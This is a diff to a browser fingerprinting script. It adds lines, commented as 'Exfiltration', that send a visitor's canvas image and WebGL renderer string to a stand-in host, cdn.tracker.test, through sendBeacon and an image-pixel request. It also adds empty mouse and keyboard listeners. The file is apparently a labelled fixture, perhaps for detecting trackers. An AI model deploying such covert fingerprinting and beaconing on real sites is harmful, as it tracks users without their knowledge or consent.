@@ -7,8 +7,15 @@
   const canvasData = c.toDataURL();
   const fonts = []; for (let i = 0; i < 60; i++) fonts.push('Font' + i);
   for (const f of fonts) { x.font = '72px ' + f + ', monospace'; x.measureText('mmmmmmmmmmlli'); }
+  let renderer = '';
   try { const gl = document.createElement('canvas').getContext('webgl'); const e = gl.getExtension('WEBGL_debug_renderer_info');
-        gl.getParameter(37446); gl.getParameter(37445); } catch (e) {}
+        renderer = gl.getParameter(37446); gl.getParameter(37445); } catch (e) {}
+  // Exfiltration: raw canvas image in a beacon body, renderer string in a URL.
+  navigator.sendBeacon('http://cdn.tracker.test/fpc', JSON.stringify({ c: canvasData }));
+  if (renderer) new Image().src = 'http://cdn.tracker.test/r.gif?r=' + encodeURIComponent(renderer);
+  // Behavioural signal collection.
+  document.addEventListener('mousemove', () => {}, { passive: true });
+  document.addEventListener('keydown', () => {});
   try { const ac = new OfflineAudioContext(1, 44100, 44100); const o = ac.createOscillator(); const k = ac.createDynamicsCompressor();
         o.connect(k); k.connect(ac.destination); o.start(0); ac.startRendering(); } catch (e) {}
   try { const pc = new RTCPeerConnection(); pc.createDataChannel(''); pc.createOffer().then(() => pc.close()); } catch (e) {}
